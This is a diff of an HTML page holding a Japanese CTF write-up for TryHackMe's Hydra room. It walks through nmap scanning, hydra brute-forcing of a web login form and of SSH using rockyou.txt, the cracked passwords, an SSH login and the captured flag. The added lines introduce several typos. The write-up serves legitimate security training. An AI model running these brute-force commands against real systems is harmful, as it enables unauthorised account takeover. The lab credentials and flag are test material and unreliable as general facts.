@@ -24,10 +24,10 @@
       <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
       許可されたラボ環境での学習目的でのみご利用ください。
     </div>
-
+    
     <article class="writeup-body">
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
-└─$ nmap 10.49.128.148
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
+└─$ nmap 10.49.128.148        
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-05 13:10 +0900
 Nmap scan report for 10.49.128.148
 Host is up (0.13s latency).
@@ -36,28 +36,28 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 
-Nmap done: 1 IP address (1 host up) scanned in 2.78 seconds</code></pre>
+Nmap done: 1 IP address (1 host up) scanned in 2.78 seconds
 
+┌──(kali㉿kali-1-kalija)-[~]
+└─$ 
+
+</code></pre>
 <p>httpを見てみる<br>
-<img alt="Pasted image 20260605131202" src="hydra/images/01-Pasted-image-20260605131202.png"><br>
-ipアドレスのみ入力したところ<code>/login</code>のページにリダイレクトし、ログインフォームが現れた</p>
-
-<p>ここではまず典型的なクレデンシャルの入力を試す<br>
+<img alt="Pasted image 20260605131202" src="hydra/images/01-Pasted-image-20260605131202.png">i<br>
+ipアドレスのみ入力したところ<code>/logn</code>のページにリダイレクトし、ログインフォームが現れた<br>
+ここではまず典型的なクレデンシャルの入力を試す<br>
 <img alt="Pasted image 20260605131314" src="hydra/images/02-Pasted-image-20260605131314.png"><br>
-<code>admin:admin</code>, <code>guest:guest</code>, <code>user:user</code>, <code>ubuntu:ubuntu</code>, <code>kali:kali</code>などを試したが上記のように<code>Your username or password is incorrect.</code>のエラーが出た<br>
-<img alt="Pasted image 20260605131516" src="hydra/images/03-Pasted-image-20260605131516.png"></p>
-
-<p>ここでTryHackMeの問題文をよく見てみると<code>molly</code>というユーザーネームが与えられていた<br>
-これを使ってブルートフォースを実施する</p>
-
-<p>hydraは次のコマンドで実施する<br>
+<code>admin:admin</code>,<code>guest:guest</code>,<code>user:user</code>,<code>ubuntu:ubuntu</code>,<code>kali:kali</code>などを試したが上記のように<code>Your username or password is incorrect.</code>のエラーが出た<img alt="Pasted image 20260605131516" src="hydra/images/03-Pasted-image-20260605131516.png"><br>
+ここでtryhackmeの問題文をよく見てみると<code>molly</code>というユーザーネームが与えられていた<br>
+これを使ってブルートフォースを実施する<br>
+hydraはつぎのコマンドで実施する<br>
 <img alt="Pasted image 20260605132048" src="hydra/images/04-Pasted-image-20260605132048.png"><br>
 ブラウザを使ったログイン試行から、ログイン失敗時に返ってくる文字列が判明しているため失敗条件を<code>F=incorrect</code>で指定できる<br>
 成功条件の指定には<code>S=</code>を用いる<br>
 <code>-t 64</code>のオプションも追加して並列スレッドをデフォルトの4倍にする</p>
-
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
-└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.128.148 http-post-form "/login:user=^USER^&amp;pass=^PASS^:F=incorrect" -t 64
+<pre><code class="language-bash">
+┌──(kali㉿kali-1-kalija)-[~]
+└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.128.148 http-post-form &quot;/login:user=^USER^&amp;pass=^PASS^:F=incorrect&quot; -t 64
 Hydra v9.7 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-05 13:22:18
@@ -65,52 +65,44 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-05 13:22:
 [DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
 [DATA] attacking http-post-form://10.49.128.148:80/login:user=^USER^&amp;pass=^PASS^:F=incorrect
 [STATUS] 3289.00 tries/min, 3289 tries in 00:01h, 14341110 to do in 72:41h, 64 active
-^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.</code></pre>
-
-<p>3000トライほどしたが見つからない<br>
+^V^C^CThe session file ./hydra.restore was written. Type &quot;hydra -R&quot; to resume session.
+</code></pre>
+<p>３０００トライほどしたが見つからない<br>
 時間がかかっている<br>
 <img alt="Pasted image 20260605133843" src="hydra/images/05-Pasted-image-20260605133843.png"><br>
-ヒントを見たところ30パスワード以上試して見つからなかったらミスをしているとのこと</p>
-
-<p>ウェブページのソースを見る<br>
+ヒントを見たところ30パスワード以上試して見つからなかったらミスをしているとのこと<br>
+ウェブページのソースを見る<br>
 <img alt="Pasted image 20260605133928" src="hydra/images/06-Pasted-image-20260605133928.png"><br>
 ログインフォームは具体的には以下の四角部分である<br>
-<img alt="Pasted image 20260605140344" src="hydra/images/07-Pasted-image-20260605140344.png"></p>
-
-<p><code>&lt;form&gt;</code> <code>&lt;/form&gt;</code>はHTMLで入力欄のまとまりを定義するタグ<br>
+<img alt="Pasted image 20260605140344" src="hydra/images/07-Pasted-image-20260605140344.png"><br>
+<code>&lt;form&gt; &lt;/form&gt;</code>はHTMLで入力欄のまとまりを定義するタグ<br>
 このタグの間に置かれた<code>&lt;input&gt;</code>などの値が送信時にまとめてサーバーに送られる<br>
-<code>action</code>は送信先、<code>method</code>は送信方法を表す<br>
+<code>action</code>は送信先、<code>methond</code>は送信方法を表す<br>
 このコードでは送信先は<code>/login</code>で送信方法は<code>post</code>であることがわかる<br>
 <code>&lt;button&gt;</code>についてはここでは<code>type="submit"</code>が定義されているので<code>input</code>などで入力された情報を送信する引き金の役割を果たしている</p>
-
 <p>つぎに<code>&lt;input&gt;</code>について見る</p>
-
-<pre><code class="language-html">&lt;input type="text" name="username" class="form-control" placeholder="Username" required autofocus&gt;
-&lt;input type="password" name="password" class="form-control" placeholder="Password" required&gt;</code></pre>
-
+<pre><code class="language-html">&lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required autofocus&gt;
+&lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required&gt;
+</code></pre>
 <p>まず<code>type</code>で入力欄の種類を定義する。<br>
-textやpasswordの他にはemail, number, url, checkboxなど多数。<br>
+testやpasswordの他にはemail, hunmber, url, checkboxなど多数。<br>
 passwordのとき入力文字が伏せ字になる<br>
 <code>name</code>はこの入力データを飛ばすときの変数名の役割を果たす<br>
 <code>class</code>はCSSの見た目指定で、送信には無関係<br>
 <code>placeholder</code>はフォームに文字が入力されていないときに薄く表示される文字列<br>
 <code>required</code>は空データをエラーとする制約<br>
 <code>autofocus</code>はページ表示時に自動でこのフォームにカーソルを当てるオプション</p>
-
 <p>なので先ほどhydraで</p>
-
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
-└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.128.148 http-post-form "/login:user=^USER^&amp;pass=^PASS^:F=incorrect" -t 64</code></pre>
-
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
+└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.128.148 http-post-form &quot;/login:user=^USER^&amp;pass=^PASS^:F=incorrect&quot; -t 64
+</code></pre>
 <p>を実行したがこれは<code>name</code>属性を読み違えている</p>
-
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
-└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.128.148 http-post-form "/login:username=^USER^&amp;password=^PASS^:F=incorrect" -t 64</code></pre>
-
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
+└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.128.148 http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:F=incorrect&quot; -t 64
+</code></pre>
 <p>このように修正してやればよい</p>
-
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
-└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.191.181 http-post-form "/login:username=^USER^&amp;password=^PASS^:F=incorrect." -t 64 -I
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
+└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.191.181 http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:F=incorrect.&quot; -t 64　-I
 Hydra v9.7 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-05 14:37:39
@@ -118,32 +110,32 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-05 14:37:
 [DATA] attacking http-post-form://10.49.191.181:80/login:username=^USER^&amp;password=^PASS^:F=incorrect.
 [80][http-post-form] host: 10.49.191.181   login: molly   password: sunshine
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-05 14:37:43</code></pre>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-05 14:37:43
 
+┌──(kali㉿kali-1-kalija)-[~]
+└─$ 
+</code></pre>
 <p>とすれば<code>molly:sunshine</code>を得られる<br>
 <img alt="Pasted image 20260605143840" src="hydra/images/08-Pasted-image-20260605143840.png"><br>
 ログイン結果としてフラグを得た</p>
-
 <p><img alt="Pasted image 20260605143936" src="hydra/images/09-Pasted-image-20260605143936.png"><br>
-2つ目のフラグも同様に試す</p>
-
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
-└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.49.191.181 -t 4</code></pre>
-
-<p>SSHの場合には上記のようなコマンドを用いる<br>
-<code>-t 4</code>とスレッド数を4に減らしているが（デフォルトは16）、SSH側の同時接続制限で接続拒否を回避するためである</p>
-
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
-└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.49.191.181 -t 4
+２つ目のフラグも同様に試す</p>
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
+└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.49.191.181 -t 4 
+</code></pre>
+<p>sshの場合には上記のようなコマンドを用いる<br>
+<code>-t 4</code>とスレッド数を４に減らしているが（デフォルトは１６）、SSH側の同時接続制限で接続拒否を回避するためである</p>
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
+└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.49.191.181 -t 4                                                     
 Hydra v9.7 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-05 14:40:25
 [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
 [DATA] attacking ssh://10.49.191.181:22/
-^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.</code></pre>
+^CThe session file ./hydra.restore was written. Type &quot;hydra -R&quot; to resume session.
 
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
-└─$ hydra -R
+┌──(kali㉿kali-1-kalija)-[~]
+└─$ hydra -R                                                                   
 Hydra v9.7 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 [INFORMATION] reading restore file ./hydra.restore
@@ -152,16 +144,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-05 14:40:
 [DATA] attacking ssh://10.49.191.181:22/
 [22][ssh] host: 10.49.191.181   login: molly   password: butterfly
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-05 14:41:10</code></pre>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-05 14:41:10
 
+┌──(kali㉿kali-1-kalija)-[~]
+└─$ 
+</code></pre>
 <p><code>butterfly</code>が得られた</p>
-
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ ssh molly@10.49.191.181
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-molly@10.49.191.181's password:
+molly@10.49.191.181's password: 
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1083-aws x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -191,13 +185,17 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
 molly@ip-10-49-191-181:~$ ls
 flag2.txt
-molly@ip-10-49-191-181:~$ cat flag2.txt
+molly@ip-10-49-191-181:~$ cat flag2.txt 
 THM{c8eeb0468febbadea859baeb33b2541b}
-molly@ip-10-49-191-181:~$</code></pre>
+molly@ip-10-49-191-181:~$ 
 
+</code></pre>
 <p>おわり</p>
-
     </article>
   </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/hydra">https://tryhackme.com/room/hydra</a></p>
+  </footer>
 </body>
 </html>
